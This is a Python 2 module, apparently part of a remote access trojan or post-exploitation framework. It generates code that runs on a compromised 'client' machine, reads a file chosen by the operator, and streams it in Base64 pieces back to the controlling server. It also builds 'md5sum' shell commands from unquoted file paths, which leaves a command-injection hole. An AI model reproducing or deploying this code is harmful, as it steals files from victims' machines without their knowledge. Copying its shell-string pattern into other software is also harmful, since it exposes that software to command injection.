from helpers import *
import os

class Module:
    """This module downloads files from the client (supports very large files).

    Files are sent over the network in small pieces (encoded with Base64),
    the server then simply decodes these pieces and writes them to the output file.
    """

    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Download a file from the client."
        }
        self.download_file = None
        self.output_folder = None
        self.buffer_size = None

    def setup(self):
        self.download_file = raw_input(MESSAGE_INPUT + "Path to file on client machine: ")
        self.output_folder = os.path.expanduser(raw_input(MESSAGE_INPUT + "Local output folder (ENTER for Output/): "))
        self.buffer_size = raw_input(MESSAGE_INPUT + "Buffer size (ENTER for 4096 bytes): ")

        # Set default variables.
        if not self.buffer_size:
            self.buffer_size = 4096
        if type(self.buffer_size) is not int:
            print MESSAGE_ATTENTION + "Invalid buffer size, using 4096."
            self.buffer_size = 4096
        if not self.output_folder:
            self.output_folder = "Output"

            if not os.path.exists("Output"):
                os.mkdir("Output")

        if os.path.exists(self.output_folder + "/" + os.path.basename(self.download_file)):
            print MESSAGE_ATTENTION + "A file with that name already exists!"
            return False
        elif not os.path.exists(self.output_folder):
            print MESSAGE_ATTENTION + "Output folder doesn't exist!"
            return False
        else:
            return True

    def run(self):
        return """\
        download_file = os.path.expanduser("{0}")
        
        
        def get_file_hash():
            return run_command("md5sum " + os.path.realpath(download_file)).split(" ")[0]
        
        
        if not os.path.exists(download_file):
            print MESSAGE_ATTENTION + "Failed to download file: invalid file path."
        else:
            send_response("MODULE|download|" + base64.b64encode("Started:" + get_file_hash()))
        
            # Send back the file in pieces to the server.
            with open(download_file, "rb") as input_file:
                while True:
                    piece = input_file.read({1})
                    
                    if not piece:
                        break
                    send_response("MODULE|download|" + base64.b64encode(piece))
            send_response("MODULE|download|" + base64.b64encode("Finished."))
        """.format(self.download_file, self.buffer_size)

    def process_response(self, response):
        output_name = os.path.basename(self.download_file)
        output_file = self.output_folder + "/" + output_name

        if "Started" in response:
            print "\n"
            print MESSAGE_INFO + "Started file download of \"{0}\"...".format(output_name)
            print MESSAGE_INFO + "Remote MD5 file hash: {0}".format(response.split(":")[1])
        elif "Finished" in response:
            print "\n"
            print MESSAGE_INFO + "Finished file download, saved to: {0}".format(output_file)
            print MESSAGE_INFO + "Local MD5 file hash (should match): {0}".format(self.get_file_hash(output_file))
        else:
            with open(output_file, "a") as output_file:
                output_file.write(response)

    def get_file_hash(self, file_path):
        return os.popen("md5sum " + os.path.realpath(file_path)).readline().split(" ")[0]
